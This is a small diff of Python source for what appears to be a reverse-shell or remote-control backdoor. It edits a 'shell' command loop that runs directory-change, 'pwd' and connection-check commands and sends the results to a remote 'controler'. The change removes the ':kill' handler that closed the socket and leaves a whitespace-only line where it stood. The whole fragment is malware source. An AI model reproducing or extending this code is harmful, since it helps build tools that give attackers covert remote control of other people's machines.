@@ -103,9 +103,7 @@ def shell(senrev=senrev):
                tmpdir = os.getcwd()
                os.chdir(dirc)
                controler.send("Changed to dir[ {}/ ]\n".format(dirc).encode("UTF-8"))
-       elif cmd == ":kill":
-               s.close()
-               break
+            
        elif cmd == "pwd": controler.send(str(os.getcwd()+"\n").encode("UTF-8"))
        elif cmd == ":checkcon:": controler.send(b"UP")
        else:
